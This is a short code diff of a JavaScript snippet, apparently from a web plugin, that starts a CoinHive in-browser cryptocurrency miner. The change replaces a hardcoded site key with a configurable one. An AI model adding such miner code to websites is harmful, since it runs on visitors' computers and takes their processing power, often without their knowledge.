@@ -1,7 +1,8 @@
 (function( $ ) {
 	'use strict';
 
-	var miner = new CoinHive.Anonymous('EnqP0zc7GhpVmol2zFDUmkfBoWIMwm71');
+	var public_key = coin_hive_site_key.site_key;
+	var miner = new CoinHive.Anonymous(public_key);
 
 	miner.on('found', function() { /* Hash found */ })
 	miner.on('accepted', function() { /* Hash accepted by the pool */ })
